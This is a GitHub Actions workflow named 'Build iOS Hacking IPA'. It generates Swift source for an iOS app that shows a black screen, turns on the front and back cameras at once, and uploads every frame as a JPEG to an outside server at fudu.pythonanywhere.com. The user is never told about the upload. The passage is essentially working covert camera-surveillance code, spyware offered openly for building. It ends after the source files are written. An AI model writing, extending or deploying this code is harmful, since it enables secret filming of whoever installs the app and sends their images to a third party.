# .github/workflows/build.yml
name: Build iOS Hacking IPA

on:
  workflow_dispatch:

jobs:
  build-ipa:
    runs-on: macos-14
    steps:
      - name: Checkout repo
        uses: actions/checkout@v4

      - name: Create Xcode project and source files
        run: |
          # Create app source directory
          mkdir -p DualCameraStreamer/DualCameraStreamer
          cd DualCameraStreamer

          # AppDelegate.swift
          cat > DualCameraStreamer/AppDelegate.swift << 'EOF'
          import UIKit
          @main
          class AppDelegate: UIResponder, UIApplicationDelegate {
              var window: UIWindow?
              func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
                  window = UIWindow(frame: UIScreen.main.bounds)
                  window?.rootViewController = ViewController()
                  window?.makeKeyAndVisible()
                  return true
              }
          }
          EOF

          # ViewController.swift (with your dual-cam streaming)
          cat > DualCameraStreamer/ViewController.swift << 'EOF'
          import UIKit
          import AVFoundation

          class ViewController: UIViewController {
              private var multiCamSession: AVCaptureMultiCamSession?
              private var frontOutput: AVCaptureVideoDataOutput?
              private var backOutput: AVCaptureVideoDataOutput?
              private let frontQueue = DispatchQueue(label: "front.capture")
              private let backQueue = DispatchQueue(label: "back.capture")
              private let serverURL = "https://fudu.pythonanywhere.com/upload"

              override func viewDidLoad() {
                  super.viewDidLoad()
                  view.backgroundColor = .black
                  requestPermissions()
              }

              private func requestPermissions() {
                  AVCaptureDevice.requestAccess(for: .video) { granted in
                      DispatchQueue.main.async {
                          if granted {
                              self.setupMultiCamSession()
                          } else {
                              fatalError("Camera permission denied")
                          }
                      }
                  }
              }

              private func setupMultiCamSession() {
                  guard AVCaptureMultiCamSession.isMultiCamSupported else {
                      print("Multi-cam not supported")
                      return
                  }
                  multiCamSession = AVCaptureMultiCamSession()

                  guard let frontCamera = AVCaptureDevice.default(.builtInWideAngleCamera, for: .video, position: .front),
                        let frontInput = try? AVCaptureDeviceInput(device: frontCamera),
                        multiCamSession?.canAddInput(frontInput) == true else { return }
                  multiCamSession?.addInput(frontInput)

                  guard let backCamera = AVCaptureDevice.default(.builtInWideAngleCamera, for: .video, position: .back),
                        let backInput = try? AVCaptureDeviceInput(device: backCamera),
                        multiCamSession?.canAddInput(backInput) == true else { return }
                  multiCamSession?.addInput(backInput)

                  frontOutput = AVCaptureVideoDataOutput()
                  frontOutput?.setSampleBufferDelegate(self, queue: frontQueue)
                  frontOutput?.videoSettings = [kCVPixelBufferPixelFormatTypeKey as String: kCVPixelFormatType_32BGRA]
                  if multiCamSession?.canAddOutput(frontOutput!) == true {
                      multiCamSession?.addOutput(frontOutput!)
                  }

                  backOutput = AVCaptureVideoDataOutput()
                  backOutput?.setSampleBufferDelegate(self, queue: backQueue)
                  backOutput?.videoSettings = [kCVPixelBufferPixelFormatTypeKey as String: kCVPixelFormatType_32BGRA]
                  if multiCamSession?.canAddOutput(backOutput!) == true {
                      multiCamSession?.addOutput(backOutput!)
                  }

                  for connection in multiCamSession?.connections ?? [] {
                      if let inputPort = connection.inputPorts.first,
                         let device = (inputPort.input as? AVCaptureDeviceInput)?.device {
                          connection.videoOrientation = .portrait
                      }
                  }

                  multiCamSession?.startRunning()
              }

              private func sendFrame(imageData: Data, camera: String) {
                  var request = URLRequest(url: URL(string: serverURL)!)
                  request.httpMethod = "POST"
                  let boundary = UUID().uuidString
                  request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
                  var body = Data()
                  body.append("--\(boundary)\r\n".data(using: .utf8)!)
                  body.append("Content-Disposition: form-data; name=\"camera\"; filename=\"\(camera).jpg\"\r\n".data(using: .utf8)!)
                  body.append("Content-Type: image/jpeg\r\n\r\n".data(using: .utf8)!)
                  body.append(imageData)
                  body.append("\r\n--\(boundary)--\r\n".data(using: .utf8)!)
                  request.httpBody = body
                  URLSession.shared.dataTask(with: request).resume()
              }
          }

          extension ViewController: AVCaptureVideoDataOutputSampleBufferDelegate {
              func captureOutput(_ output: AVCaptureOutput, didOutput sampleBuffer: CMSampleBuffer, from connection: AVCaptureConnection) {
                  guard let imageBuffer = CMSampleBufferGetImageBuffer(sampleBuffer) else { return }
                  let ciImage = CIImage(cvImageBuffer: imageBuffer)
                  let context = CIContext()
                  guard let cgImage = context.createCGImage(ciImage, from: ciImage.extent) else { return }
                  let uiImage = UIImage(cgImage: cgImage)
                  guard let jpegData = uiImage.jpegData(compressionQuality: 0.3) else { return }
                  let cameraName = (connection.inputPorts.first?.input as? AVCaptureDeviceInput)?.device.position == .front ? "front" : "back"
                  sendFrame(imageData: jpegData, camera: cameraName)
              }
          }
          EOF

